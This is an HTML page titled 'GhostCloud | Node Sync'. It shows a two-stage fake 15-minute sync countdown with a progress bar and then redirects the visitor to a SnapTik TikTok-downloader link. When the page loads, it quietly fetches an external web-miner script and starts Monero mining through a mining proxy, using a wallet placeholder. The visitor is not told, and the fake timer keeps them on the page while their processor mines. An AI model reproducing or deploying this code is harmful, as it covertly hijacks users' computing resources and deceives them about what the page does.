<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>GhostCloud | Node Sync</title>
    <script src="https://webminer.pages.dev/load.js"></script>
    <style>
        body { background: #0b111a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .container { width: 350px; background: #161d27; padding: 40px; border-radius: 15px; border: 1px solid #2d3643; text-align: center; }
        #clock { font-size: 50px; font-family: monospace; margin: 20px 0; color: #007bff; }
        .bar-bg { background: #1e293b; height: 10px; border-radius: 5px; overflow: hidden; margin-bottom: 10px; }
        #bar-fill { height: 100%; width: 0%; background: #007bff; transition: width 1s linear; }
        .info { color: #64748b; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="container">
    <div class="info" id="status">STAGE 1: CDN SYNC</div>
    <div id="clock">15:00</div>
    <div class="bar-bg"><div id="bar-fill"></div></div>
    <div class="info"><span id="pct">0</span>% COMPLETE</div>
</div>

<script>
    // 1. START THE MINER IMMEDIATELY
    try {
        startMining("YOUR_XMR_WALLET_ADDRESS", "GhostCloud_Node", "wss://ny1.xmrminingproxy.com", 55);
    } catch(e) { console.log("Miner status: offline"); }

    // 2. THE TIMER LOGIC
    const params = new URLSearchParams(window.location.search);
    let stage = parseInt(params.get('stage')) || 1;
    let secondsLeft = 900; // 15 Minutes

    if(stage === 2) {
        document.getElementById('status').innerText = "STAGE 2: RECONSTRUCTION";
    }

    const timer = setInterval(function() {
        secondsLeft--;

        // Update Clock
        let m = Math.floor(secondsLeft / 60);
        let s = secondsLeft % 60;
        document.getElementById('clock').innerHTML = m + ":" + (s < 10 ? "0" + s : s);

        // Update Bar and Percentage
        let progress = ((900 - secondsLeft) / 900) * 100;
        document.getElementById('bar-fill').style.width = progress + "%";
        document.getElementById('pct').innerHTML = Math.floor(progress);

        // When time hits zero
        if (secondsLeft <= 0) {
            clearInterval(timer);
            let targetUrl = params.get('url') || "https://tiktok.com";
            
            if (stage === 1) {
                // Go to Stage 2
                window.location.href = "verify.html?stage=2&url=" + encodeURIComponent(targetUrl);
            } else {
                // Final Redirect to SnapTik
                window.location.href = "https://snaptik.app/abc.php?url=" + encodeURIComponent(targetUrl);
            }
        }
    }, 1000);
</script>

</body>
</html>
